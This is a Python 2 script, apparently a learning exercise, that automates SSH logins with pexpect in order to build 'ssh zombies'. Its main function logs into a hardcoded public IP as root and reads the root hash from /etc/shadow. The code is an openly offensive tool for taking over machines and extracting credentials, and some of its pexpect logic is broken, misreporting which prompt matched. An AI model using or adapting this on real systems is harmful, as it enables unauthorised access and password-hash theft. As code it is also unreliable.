# _*_coding:utf8-
import pexpect

'''
This code we learning how to use pexpect to achieve ssh zombies.
actually,pexpect like "os.system() + regex"

pexpect package document:
    https://pexpect.readthedocs.io/en/3.x/api/pexpect.html?highlight=pexpect.spawn#pexpect.spawn
    https://blog.csdn.net/taiyangdao/article/details/73656766
Note:
---------
    1.Make sure you have ssh,can use apt install ssh installation SSH if you not have it.
    2.you know what is Regular expression

'''

# when you success login you target computer,you maybe use it.
# this regex is beginning most terminals line
PROMPT = ['# ','>>> ','> ','\$ ']

def send_command(child,cmd):
    '''
    send your message in your target terminal, and mat your regular expression

    Parameters:
    ----------
        :param child: result of create spawn
        :param cmd:you input message in your target terminal
        :return: child.before:: You can see all the data read before the match

        child.sendline: write your message (include enter)
        child.expect: math your target regular expression
    '''
    child.sendline(cmd)
    child.expect(PROMPT)
    print child.before

def connect(user,host,password):
    '''
    try connect your target computer's ssh

    Parameters:
    ----------
        :param user: target computer's hostname
        :param host: target computer's ip
        :param password: target computer's password in ssh
        :return: child
    Note:
    ----
        1.ssh_newkey: maybe change,This just an example
        2.connStr: you run cmd in spawn, like os.system(connStr)
        3.ret: start with 0, if "pexpect.TIMEOUT" match success,then return 0 or ssh_newkey match success,then return
            1 .... and so on~~.
            Actually,ret is your regular code index
        4. you can use "child.match.group(0)" views your match result


    '''
    ssh_newkey = 'Are you sure you want to continue connecting'
    connStr = 'ssh ' + user + '@' + host  # Note your ssh Installation location
    child = pexpect.spawn(connStr)

    ret = child.expect([pexpect.TIMEOUT, ssh_newkey,'[P|p]assword:'])

    if ret == 0:
        # then,it's timeout check your network or your target compute's network
        print '[-] Error Connectiong'
    if ret == 1:
        # congratulations, you can send password
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT,'[P|p]assword:'],'Permission denied, please try again.')
    if ret == 0:
        print '[-] Error Connecting'
    if ret == 2:
        # !_!, yor password is Wrong ~~
        print '[-] Your password Error'
    child.sendline(password)
    child.expect(PROMPT)
    return child

def main():
    '''
    start your code
    :return: None
    Parameters:
    ----------
        host: your target host
        password: your target password
    '''
    host = '39.107.226.129'
    user = 'root'
    password = ''
    child = connect(user=user,host=host,password=password)
    send_command(child,'cat /etc/shadow | grep root')


if __name__ == '__main__':
    main()